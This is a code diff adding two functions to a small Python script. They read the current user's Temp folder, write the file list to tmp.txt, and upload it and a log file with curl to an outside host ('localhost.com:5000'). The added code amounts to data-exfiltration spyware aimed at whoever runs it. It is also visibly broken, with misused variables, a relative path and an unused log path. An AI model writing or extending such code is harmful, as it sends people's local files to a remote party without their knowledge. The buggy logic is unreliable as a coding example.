@@ -1,6 +1,9 @@
 import getpass
 import platform
 import os
+from pathlib import Path
+import subprocess
+
 path = str()
 MAXSIZE = 5096
 
@@ -63,8 +66,30 @@ def check_file(file):
     print(f"File size: {size} bytes")  
     return size                     # Return to original position
     
+def get_files():
+    #list files in current director
+    username = getpass.getuser()
+    tmp_file_path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\tmp.txt").format(username)
 
-      
+    path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\").format(username)
+    files = [f for f in Path(path).iterdir() if f.is_file()]
+
+    with open(tmp_file_path, "w") as path:
+        for f in files:
+            path.write(f)
+            print (f)
+        
+        path.close()
+
+    #send file
+    subprocess.run(["curl", "-F", "file=@tmp.txt", "https://localhost.com:5000"])
+    print("File sent...")
+
+def send_log():
+    username = getpass.getuser()
+    log_path = ("C:\\Users\\{}\\AppData\\LocalLow\\Temp\\log.txt").format(username)
+    result = subprocess.run(["curl", "-F", f"file={path}", "https://localhost.com:5000"])
+    print(result.stdout)
 
 
 
